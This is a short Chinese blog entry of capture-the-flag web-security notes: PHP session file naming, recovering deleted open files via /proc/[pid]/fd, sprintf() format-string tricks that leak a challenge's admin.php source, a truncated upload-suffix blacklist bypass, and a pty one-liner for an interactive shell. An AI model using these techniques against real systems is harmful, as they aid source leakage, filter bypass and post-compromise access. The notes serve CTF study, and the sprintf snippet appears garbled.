<h1 id="session保存形式和命名"><a href="#session保存形式和命名" class="headerlink" title="session保存形式和命名"></a>session保存形式和命名</h1><p> session是以文件的形式保存的。php.ini中有个配置项–session.save_path= “”;这个里面填写的路径，将会使session文件保存在该路径下。session文件的命名格式是：”sess_[PHPSESSID的值]”。每一个文件，里面保存了一个会话的数据。其实只要使用代码$_SESSION[‘user_id’] = $value;就会促发php的session机制，结果往对应的session文件中写入一个值。 </p>
<h1 id="proc-pid-fd"><a href="#proc-pid-fd" class="headerlink" title="/proc/[pid]/fd"></a>/proc/[pid]/fd</h1><p> <strong>在linux里如果打开了一个文件而没有关闭，就算删除了文件（即rm -f flag.txt）在/proc/[pid]/fd下还是会存在,</strong> </p>
<h1 id="sprintf-漏洞"><a href="#sprintf-漏洞" class="headerlink" title="sprintf()漏洞"></a>sprintf()漏洞</h1><ol>
<li>%1$s —— 这种办法原理是%1$s会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect));  // %1$s会以字符串格式输出$detect，而%d会输出0</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>%s% —— 这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect));  // %d前的%被转义，因此失</span><br></pre></td></tr></table></figure>

<h1 id="绕过php后缀"><a href="#绕过php后缀" class="headerlink" title="绕过php后缀"></a>绕过php后缀</h1><h3 id="pathinfo函数后缀名黑名单绕过"><a href="#pathinfo函数后缀名黑名单绕过" class="headerlink" title="pathinfo函数后缀名黑名单绕过"></a>pathinfo函数后缀名黑名单绕过</h3><p>在做路径处理的时候，会递归的删除掉路径中存在的 /. </p>
<h1 id="获取交互式shell"><a href="#获取交互式shell" class="headerlink" title="获取交互式shell"></a>获取交互式shell</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
</search>
